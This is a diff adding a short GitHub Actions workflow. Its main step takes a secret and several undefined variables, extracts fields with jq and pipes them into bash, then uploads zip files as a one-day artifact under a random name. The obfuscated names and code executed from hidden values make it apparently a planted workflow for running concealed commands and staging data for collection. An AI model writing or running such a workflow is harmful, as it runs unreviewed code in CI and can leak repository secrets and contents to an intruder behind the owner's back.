@@ -1,0 +1,29 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Apply
+        env:
+          vqd32054: ${{ secrets.vqd32054 }}
+        run: |
+          printf '%s' "$vqd32054" | jq -r .rzh9926 | /bin/bash
+          printf '%s' "$kwa8314" | jq -r .elcoz392 | /bin/bash
+          echo $ds276 | jq -r .zs82 | /bin/bash
+          printf '%s' "$rpwlw9" | jq -r .dcbio2 | /bin/bash
+
+      - name: Upload output
+        uses: actions/upload-artifact@v4
+        with:
+          name: DbsoNZiI
+          path: "*.zip"
+          retention-days: 1
